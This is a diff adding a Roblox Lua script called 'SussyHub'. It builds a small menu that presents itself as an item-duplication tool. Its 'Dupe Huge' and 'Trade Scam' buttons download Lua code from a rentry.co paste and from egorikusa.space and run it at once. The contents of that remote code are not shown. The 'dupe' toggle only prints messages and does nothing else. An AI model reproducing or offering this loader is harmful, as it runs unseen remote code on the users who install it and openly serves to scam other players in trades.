@@ -1,0 +1,57 @@
+local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
+local Window = OrionLib:MakeWindow({
+    Name = "SussyHub",
+    HidePremium = false,
+    Introtext = "Dupe",
+    SaveConfig = true,
+    ConfigFolder = "SussyHub"
+})
+
+OrionLib:MakeNotification({
+    Name = "🤫",
+    Content = " successful",
+    Image = "rbxassetid://4483345998",
+    Time = 5
+})
+
+local TutTab = Window:MakeTab({
+    Name = "Dupe",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local Section = TutTab:AddSection({
+    Name = "Dupe Section"
+})
+
+TutTab:AddButton({
+    Name = "Dupe Huge",
+    Callback = function()
+        loadstring(game:HttpGet('https://rentry.co/cwp9dfqy/raw', true))()
+        print("Dupe script executed!")
+    end    
+})
+
+TutTab:AddToggle({
+    Name = "Tap this to make the dupe work",
+    Default = false,
+    Callback = function(Value)
+        if Value then
+            print("Dupe enabled")
+            -- Add your dupe logic here if applicable
+        else
+            print("Dupe disabled")
+            -- Add disable logic if needed
+        end
+    end    
+})
+
+TutTab:AddButton({
+    Name = "Trade Scam",
+    Callback = function()
+        loadstring(game:HttpGet("https://egorikusa.space/5caab90594d14d78afce27a5.lua", true))()
+        print("Trade scam script executed!")
+    end    
+})
+
+OrionLib:Init()
